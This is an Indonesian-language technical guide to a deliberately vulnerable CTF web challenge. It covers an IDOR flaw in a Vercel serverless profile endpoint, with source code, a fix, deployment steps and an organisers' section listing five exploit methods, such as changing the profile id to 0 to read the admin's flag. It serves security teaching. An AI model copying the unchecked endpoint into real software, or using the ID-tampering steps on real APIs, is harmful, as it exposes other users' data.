# Penjelasan Teknis - CTF Challenge IDOR

## 📋 Daftar Isi

1. [Penjelasan Teknologi](#penjelasan-teknologi)
2. [Struktur Folder Project](#struktur-folder-project)
3. [Penjelasan Source Code](#penjelasan-source-code)
4. [Penjelasan Vulnerability](#penjelasan-vulnerability)
5. [Cara Exploit](#cara-exploit)
6. [Langkah Deploy ke Vercel](#langkah-deploy-ke-vercel)

---

## 1. Penjelasan Teknologi

### 1.1 Vercel Serverless Function

**Apa itu Vercel Serverless Function?**

Vercel Serverless Function adalah fungsi backend yang berjalan on-demand tanpa perlu mengelola server. Setiap file JavaScript di folder `/api` otomatis menjadi endpoint HTTP.

**Cara Kerja:**

```
File: api/login.js
↓
Endpoint: https://your-app.vercel.app/api/login
```

**Keuntungan:**
- ✅ Gratis (Free tier sangat generous)
- ✅ Auto-scaling (otomatis menangani traffic tinggi)
- ✅ Zero configuration (tidak perlu setup server)
- ✅ Deploy dalam hitungan detik

**Struktur Serverless Function:**

```javascript
module.exports = async (req, res) => {
  // req = HTTP request object
  // res = HTTP response object
  
  // Akses method: req.method (GET, POST, dll)
  // Akses query params: req.query
  // Akses body: req.body
  
  // Return response
  res.status(200).json({ message: 'Success' });
};
```

### 1.2 Node.js API

**Bagaimana Node.js API Menangani Request?**

1. **Menerima Request**
   ```javascript
   // Client mengirim request
   fetch('/api/login', {
     method: 'POST',
     body: JSON.stringify({ username, password })
   })
   ```

2. **Server Memproses**
   ```javascript
   module.exports = async (req, res) => {
     // Cek HTTP method
     if (req.method !== 'POST') {
       return res.status(405).json({ error: 'Method not allowed' });
     }
     
     // Ambil data dari request body
     const { username, password } = req.body;
     
     // Proses logic (validasi, query database, dll)
     const user = findUser(username, password);
     
     // Return response
     res.status(200).json({ userId: user.id });
   }
   ```

3. **Client Menerima Response**
   ```javascript
   const data = await response.json();
   console.log(data.userId);
   ```

**Komponen Penting:**

- `req.method` - HTTP method (GET, POST, PUT, DELETE)
- `req.query` - Query parameters dari URL (`?id=1`)
- `req.body` - Data dari request body (POST/PUT)
- `res.status()` - Set HTTP status code
- `res.json()` - Return JSON response

### 1.3 Frontend-Backend Communication

**Fetch API - Cara Berkomunikasi dengan Backend**

```javascript
// 1. GET Request (mengambil data)
const response = await fetch('/api/profile?id=1');
const data = await response.json();

// 2. POST Request (mengirim data)
const response = await fetch('/api/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ username, password })
});
const data = await response.json();
```

**Flow Komunikasi:**

```
Browser (index.html)
    ↓ fetch('/api/login')
Vercel Serverless Function (api/login.js)
    ↓ baca users.json
Data Storage (data/users.json)
    ↓ return user data
Vercel Serverless Function
    ↓ res.json({ userId, username })
Browser (simpan di localStorage)
```

---

## 2. Struktur Folder Project

```
ctf-idor-challenge/
│
├── public/                      # Frontend files
│   ├── index.html              # Halaman login
│   ├── dashboard.html          # Halaman dashboard user
│   └── styles.css              # Styling (dark theme, modern UI)
│
├── api/                        # Backend serverless functions
│   ├── login.js                # Endpoint autentikasi
│   └── profile.js              # Endpoint profile (VULNERABLE!)
│
├── data/                       # Data storage
│   └── users.json              # Database user (4 users: 1 admin, 3 employee)
│
├── vercel.json                 # Konfigurasi Vercel (routing, CORS)
├── package.json                # Project metadata
├── .gitignore                  # File yang diabaikan Git
└── README.md                   # Dokumentasi challenge
```

**Penjelasan Setiap Folder:**

- **`public/`**: Berisi file frontend yang diakses langsung oleh browser
- **`api/`**: Berisi serverless functions (backend logic)
- **`data/`**: Berisi file JSON sebagai database sederhana
- **`vercel.json`**: Konfigurasi routing dan headers untuk Vercel
- **`package.json`**: Metadata project dan dependencies

---

## 3. Penjelasan Source Code

### 3.1 Data Layer - `data/users.json`

```json
[
  {
    "id": 0,
    "username": "admin",
    "password": "admin2024",
    "role": "admin",
    "fullName": "Administrator",
    "email": "admin@company.com",
    "department": "IT Security",
    "flag": "ICH{G3l0_D4h_b1s4_1D0R}"  // ← FLAG ADA DI SINI!
  },
  {
    "id": 1,
    "username": "employee1",
    "password": "pass123",
    "role": "employee",
    "fullName": "John Doe",
    "email": "john.doe@company.com",
    "department": "Marketing"
    // ← Tidak ada field "flag"
  }
  // ... employee2, employee3
]
```

**Poin Penting:**
- Admin memiliki `id: 0` (ini akan menjadi target exploit)
- Hanya admin yang memiliki field `flag`
- Password disimpan plain text (untuk kemudahan CTF, bukan best practice!)

### 3.2 Backend - `api/login.js`

**Fungsi:** Autentikasi user dan return user ID

```javascript
const fs = require('fs');
const path = require('path');

module.exports = async (req, res) => {
  // 1. Set CORS headers (agar frontend bisa akses API)
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  // 2. Hanya terima POST request
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // 3. Baca file users.json
  const usersPath = path.join(process.cwd(), 'data', 'users.json');
  const usersData = fs.readFileSync(usersPath, 'utf8');
  const users = JSON.parse(usersData);

  // 4. Ambil username & password dari request
  const { username, password } = req.body;

  // 5. Cari user yang cocok
  const user = users.find(u => 
    u.username === username && u.password === password
  );

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // 6. Return HANYA userId dan username (bukan full profile!)
  return res.status(200).json({
    success: true,
    userId: user.id,      // ← Ini yang akan disimpan di localStorage
    username: user.username
  });
};
```

**Flow:**
1. Client POST `{ username, password }`
2. Server baca `users.json`
3. Server cari user yang match
4. Server return `{ userId, username }`
5. Client simpan di `localStorage`

**Kenapa tidak return full profile?**
- Karena profile akan diambil dari endpoint terpisah (`/api/profile`)
- Ini adalah pattern umum dalam API design
- **Ini juga yang membuat IDOR vulnerability mungkin terjadi!**

### 3.3 Backend - `api/profile.js` (VULNERABLE!)

**Fungsi:** Return profile user berdasarkan ID

```javascript
module.exports = async (req, res) => {
  // 1. Baca users.json
  const usersPath = path.join(process.cwd(), 'data', 'users.json');
  const usersData = fs.readFileSync(usersPath, 'utf8');
  const users = JSON.parse(usersData);

  // 2. Ambil user ID dari query parameter
  const userId = req.query.id;  // ← Dari URL: /api/profile?id=1

  // ⚠️ VULNERABILITY: TIDAK ADA AUTHORIZATION CHECK!
  // Server TIDAK cek apakah user yang login boleh akses ID ini
  
  // 3. Cari user berdasarkan ID
  const user = users.find(u => u.id === parseInt(userId));

  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  // 4. Return profile (termasuk flag jika ada!)
  const { password, ...userProfile } = user;
  return res.status(200).json({
    success: true,
    profile: userProfile
  });
};
```

**⚠️ VULNERABILITY EXPLANATION:**

```javascript
// Yang SEHARUSNYA dilakukan:
const loggedInUserId = getLoggedInUser(req); // dari session/token
if (loggedInUserId !== parseInt(userId)) {
  return res.status(403).json({ error: 'Forbidden' });
}

// Tapi kode di atas TIDAK ADA!
// Jadi siapa saja bisa akses profile siapa saja!
```

### 3.4 Frontend - `public/index.html`

**Fungsi:** Halaman login

**Bagian Penting:**

```javascript
// Submit form login
loginForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  
  // Kirim request ke backend
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });
  
  const data = await response.json();
  
  if (data.success) {
    // Simpan userId di localStorage
    localStorage.setItem('userId', data.userId);
    localStorage.setItem('username', data.username);
    
    // Redirect ke dashboard
    window.location.href = '/dashboard.html';
  }
});
```

**Flow:**
1. User input username & password
2. JavaScript kirim POST request ke `/api/login`
3. Jika berhasil, simpan `userId` di `localStorage`
4. Redirect ke `dashboard.html`

### 3.5 Frontend - `public/dashboard.html`

**Fungsi:** Tampilkan profile user yang login

**Bagian Penting:**

```javascript
// Ambil userId dari localStorage
const userId = localStorage.getItem('userId');

// Fetch profile dari API
async function loadProfile() {
  // ⚠️ PERHATIKAN: userId diambil dari localStorage
  // dan langsung dimasukkan ke URL!
  const response = await fetch(`/api/profile?id=${userId}`);
  const data = await response.json();
  
  if (data.success) {
    const profile = data.profile;
    
    // Tampilkan data profile
    document.getElementById('fullName').textContent = profile.fullName;
    document.getElementById('email').textContent = profile.email;
    
    // Jika ada flag, tampilkan!
    if (profile.flag) {
      document.getElementById('flagValue').textContent = profile.flag;
      document.getElementById('flagContainer').style.display = 'block';
    }
  }
}
```

**⚠️ VULNERABILITY POINT:**

```javascript
// userId diambil dari localStorage (client-side)
const userId = localStorage.getItem('userId');  // "1"

// Langsung digunakan di URL
fetch(`/api/profile?id=${userId}`)  // /api/profile?id=1

// Attacker bisa ubah localStorage atau langsung ubah URL!
```

### 3.6 Configuration - `vercel.json`

```json
{
  "rewrites": [
    { "source": "/", "destination": "/public/index.html" },
    { "source": "/dashboard.html", "destination": "/public/dashboard.html" },
    { "source": "/styles.css", "destination": "/public/styles.css" },
    { "source": "/api/(.*)", "destination": "/api/$1" }
  ]
}
```

**Penjelasan:**
- `rewrites`: Mapping URL ke file
- `/` → `public/index.html` (root menampilkan login page)
- `/api/*` → `api/*` (semua request ke /api diteruskan ke serverless functions)

---

## 4. Penjelasan Vulnerability

### 4.1 Apa itu IDOR?

**IDOR (Insecure Direct Object Reference)** adalah vulnerability dimana aplikasi mengekspos referensi langsung ke objek internal (seperti database ID) tanpa proper authorization check.

**Contoh Sederhana:**

```
Normal request:
GET /api/profile?id=1  → Return profile user 1 (milik user yang login)

IDOR attack:
GET /api/profile?id=0  → Return profile admin (padahal yang login bukan admin!)
```

### 4.2 Di Mana Vulnerability Terjadi?

**File:** `api/profile.js`  
**Line:** 

```javascript
// Line ~25-30
const userId = req.query.id;  // ← Ambil dari URL parameter
const user = users.find(u => u.id === parseInt(userId));
// ← TIDAK ADA CEK AUTHORIZATION!
```

**Diagram Flow:**

```
User login sebagai employee1 (id=1)
    ↓
localStorage.setItem('userId', '1')
    ↓
Dashboard fetch: /api/profile?id=1
    ↓
Server return: profile employee1 ✅
    
TAPI...

Attacker ubah request: /api/profile?id=0
    ↓
Server return: profile admin ❌ (SEHARUSNYA FORBIDDEN!)
    ↓
Flag muncul: ICH{G3l0_D4h_b1s4_1D0R}
```

### 4.3 Mengapa Bisa Diakses?

**3 Alasan Utama:**

1. **Tidak Ada Session Verification**
   ```javascript
   // Seharusnya ada:
   const loggedInUser = verifySession(req.headers.authorization);
   // Tapi TIDAK ADA!
   ```

2. **Trust Client-Side Data**
   ```javascript
   // Server percaya parameter dari client
   const userId = req.query.id;  // ← Client bisa ubah ini!
   ```

3. **Predictable IDs**
   ```javascript
   // ID sequential dan mudah ditebak
   id: 0, 1, 2, 3  // ← Attacker bisa coba semua
   ```

### 4.4 Perbedaan Authentication vs Authorization

| Aspek | Authentication | Authorization |
|-------|---------------|---------------|
| **Pertanyaan** | "Siapa kamu?" | "Apa yang boleh kamu akses?" |
| **Implementasi** | Login dengan username/password | Cek permission sebelum akses resource |
| **Di Challenge** | ✅ Ada (login.js) | ❌ TIDAK ADA (profile.js) |

**Dalam Challenge Ini:**

- ✅ **Authentication**: User harus login dulu (ada di `api/login.js`)
- ❌ **Authorization**: User TIDAK dicek apakah boleh akses profile tertentu

### 4.5 Cara Fix yang Benar

```javascript
// api/profile.js - FIXED VERSION

module.exports = async (req, res) => {
  // 1. Verify session token
  const token = req.headers.authorization;
  const loggedInUserId = verifyToken(token);  // ← Tambahkan ini!
  
  if (!loggedInUserId) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  // 2. Get requested user ID
  const requestedUserId = parseInt(req.query.id);
  
  // 3. AUTHORIZATION CHECK
  if (loggedInUserId !== requestedUserId) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  // 4. Baru boleh return data
  const user = users.find(u => u.id === requestedUserId);
  return res.json({ profile: user });
};
```

---

## 5. Cara Exploit (Untuk Panitia)

### 5.1 Metode 1: Browser DevTools Console

**Langkah-langkah:**

1. **Login sebagai user biasa**
   - Username: `employee1`
   - Password: `pass123`

2. **Buka DevTools**
   - Tekan `F12` atau `Ctrl+Shift+I`

3. **Pergi ke tab Console**

4. **Jalankan exploit code:**
   ```javascript
   fetch('/api/profile?id=0')
     .then(response => response.json())
     .then(data => {
       console.log('Admin Profile:', data);
       console.log('FLAG:', data.profile.flag);
     });
   ```

5. **Flag akan muncul di console:**
   ```
   FLAG: ICH{G3l0_D4h_b1s4_1D0R}
   ```

### 5.2 Metode 2: Direct URL Access

**Langkah-langkah:**

1. **Login sebagai user biasa**

2. **Buka tab baru**

3. **Akses langsung endpoint API:**
   ```
   https://your-app.vercel.app/api/profile?id=0
   ```

4. **Response JSON akan muncul:**
   ```json
   {
     "success": true,
     "profile": {
       "id": 0,
       "username": "admin",
       "role": "admin",
       "fullName": "Administrator",
       "email": "admin@company.com",
       "department": "IT Security",
       "flag": "ICH{G3l0_D4h_b1s4_1D0R}"
     }
   }
   ```

### 5.3 Metode 3: Modify localStorage

**Langkah-langkah:**

1. **Login sebagai user biasa**

2. **Buka DevTools → Console**

3. **Ubah userId di localStorage:**
   ```javascript
   localStorage.setItem('userId', '0');
   ```

4. **Reload page:**
   ```javascript
   location.reload();
   ```

5. **Dashboard akan menampilkan profile admin dengan flag!**

### 5.4 Metode 4: Network Tab Manipulation

**Langkah-langkah:**

1. **Login sebagai user biasa**

2. **Buka DevTools → Network tab**

3. **Lihat request ke `/api/profile?id=1`**

4. **Right-click → Copy → Copy as fetch**

5. **Paste di Console dan ubah ID:**
   ```javascript
   fetch("/api/profile?id=0", {
     "headers": {
       "accept": "*/*",
     },
     "method": "GET"
   })
   .then(r => r.json())
   .then(data => console.log(data.profile.flag));
   ```

### 5.5 Metode 5: Burp Suite / Postman (Advanced)

**Menggunakan Burp Suite:**

1. Intercept request ke `/api/profile?id=1`
2. Ubah parameter menjadi `id=0`
3. Forward request
4. Lihat response dengan flag

**Menggunakan Postman:**

1. Buat GET request ke `https://your-app.vercel.app/api/profile?id=0`
2. Send
3. Lihat response JSON

---

## 6. Langkah Deploy ke Vercel

### 6.1 Persiapan

**Yang Dibutuhkan:**
- ✅ Akun GitHub (gratis)
- ✅ Akun Vercel (gratis)
- ✅ Git terinstall di komputer

### 6.2 Step-by-Step Deployment

#### Step 1: Initialize Git Repository

```bash
# Masuk ke folder project
cd /home/nathan/UKM/ctf-idor-challenge

# Initialize git
git init

# Add semua file
git add .

# Commit
git commit -m "Initial commit: CTF IDOR Challenge"
```

#### Step 2: Create GitHub Repository

1. **Buka GitHub:** https://github.com
2. **Klik tombol "New repository"** (pojok kanan atas)
3. **Isi form:**
   - Repository name: `ctf-idor-challenge`
   - Description: `CTF Challenge - IDOR Vulnerability`
   - Visibility: **Public** atau **Private** (terserah)
   - **JANGAN** centang "Initialize with README" (kita sudah punya)
4. **Klik "Create repository"**

#### Step 3: Push ke GitHub

```bash
# Add remote repository
git remote add origin https://github.com/YOUR_USERNAME/ctf-idor-challenge.git

# Ganti YOUR_USERNAME dengan username GitHub Anda!

# Rename branch ke main
git branch -M main

# Push ke GitHub
git push -u origin main
```

**Jika diminta login:**
- Username: username GitHub Anda
- Password: gunakan **Personal Access Token** (bukan password biasa)
  - Cara buat token: GitHub → Settings → Developer settings → Personal access tokens

#### Step 4: Deploy ke Vercel

1. **Buka Vercel:** https://vercel.com

2. **Login/Sign Up:**
   - Pilih "Continue with GitHub"
   - Authorize Vercel

3. **Import Project:**
   - Klik "Add New..." → "Project"
   - Pilih repository `ctf-idor-challenge`
   - Klik "Import"

4. **Configure Project:**
   - **Project Name:** `ctf-idor-challenge` (atau sesuai keinginan)
   - **Framework Preset:** Vercel akan auto-detect (biarkan default)
   - **Root Directory:** `./` (default)
   - **Build Settings:** Biarkan default
   - **Environment Variables:** Tidak perlu (kita tidak pakai)

5. **Deploy:**
   - Klik "Deploy"
   - Tunggu ~1-2 menit

6. **Success!**
   - Vercel akan memberikan URL: `https://ctf-idor-challenge.vercel.app`
   - Klik URL untuk test

#### Step 5: Test Deployment

1. **Buka URL Vercel Anda**

2. **Test Login:**
   - Username: `employee1`
   - Password: `pass123`

3. **Test IDOR:**
   - Buka Console
   - Jalankan: `fetch('/api/profile?id=0').then(r=>r.json()).then(console.log)`
   - Flag harus muncul!

### 6.3 Update Deployment (Jika Ada Perubahan)

```bash
# Edit file yang ingin diubah
nano api/profile.js

# Add dan commit
git add .
git commit -m "Update: fix typo"

# Push ke GitHub
git push

# Vercel akan AUTO-DEPLOY! (tidak perlu klik apa-apa)
```

### 6.4 Custom Domain (Opsional)

Jika ingin domain custom (misal: `ctf.ukm-cyber.com`):

1. **Beli domain** (di Namecheap, GoDaddy, dll)

2. **Di Vercel:**
   - Project Settings → Domains
   - Add domain Anda
   - Ikuti instruksi DNS configuration

3. **Di Domain Provider:**
   - Tambahkan DNS record sesuai instruksi Vercel

### 6.5 Monitoring & Logs

**Melihat Logs:**
1. Vercel Dashboard → Project → Deployments
2. Klik deployment tertentu
3. Tab "Functions" → Pilih function → Lihat logs

**Melihat Analytics:**
1. Vercel Dashboard → Project → Analytics
2. Lihat jumlah request, response time, dll

---

## 🎯 Kesimpulan

Challenge ini mengajarkan:

1. **API Basics:**
   - Cara kerja HTTP request/response
   - GET vs POST methods
   - Query parameters vs request body

2. **Authentication vs Authorization:**
   - Authentication = verifikasi identitas
   - Authorization = verifikasi permission
   - Keduanya HARUS ada!

3. **IDOR Vulnerability:**
   - Terjadi karena tidak ada authorization check
   - Attacker bisa akses data user lain
   - Fix: selalu verify permission sebelum return data

4. **Serverless Architecture:**
   - Cara deploy aplikasi tanpa manage server
   - Vercel Serverless Functions
   - Deploy gratis dan mudah

---

**Dibuat oleh:** UKM Cyber Security  
**Untuk:** Educational CTF Challenge  
**Tahun:** 2026
